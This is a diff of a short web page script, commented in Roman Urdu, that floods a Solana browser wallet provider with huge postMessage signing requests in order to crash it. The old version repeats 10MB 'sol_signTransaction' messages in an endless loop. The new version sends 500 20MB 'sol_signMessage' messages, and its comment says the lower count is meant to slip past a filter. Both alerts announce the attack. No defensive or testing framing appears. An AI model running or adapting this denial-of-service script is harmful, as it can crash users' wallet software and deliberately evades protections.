@@ -1,28 +1,15 @@
-<!DOCTYPE html>
-<html>
-<body style="background-color: black; color: red; text-align: center; padding-top: 100px;">
-    <h1>CRITICAL STABILITY TEST...</h1>
-    <p>Loading Heavy Payload (50MB+ RAM Pressure)</p>
-    <script>
-        function triggerFlood() {
-            // 10MB ka aik bohot bada message
-            const heavyData = "B".repeat(10 * 1024 * 1024); 
-            
-            // Loop ko 5,000 baar chalayein
-            for (let i = 0; i < 5000; i++) {
-                window.postMessage({
-                    target: "provider",
-                    data: { method: "sol_signTransaction", params: [heavyData] }
-                }, "*");
-            }
-            // Self-triggering loop (infinite pressure)
-            setTimeout(triggerFlood, 500); 
+<script>
+    setTimeout(() => {
+        // 20MB ka aik hi message (Pehle se 4 guna bada)
+        const ultraHeavy = "Z".repeat(20 * 1024 * 1024); 
+        
+        // Loop ko kam baar chalayein taake filter na pakre
+        for (let i = 0; i < 500; i++) {
+            window.postMessage({
+                target: "provider",
+                data: { method: "sol_signMessage", params: [ultraHeavy] }
+            }, "*");
         }
-
-        setTimeout(() => {
-            triggerFlood();
-            alert("Attack Sent! Check for Crash.");
-        }, 2000);
-    </script>
-</body>
-</html>
+        alert("System Overload Sent! Check if touch works.");
+    }, 2000);
+</script>
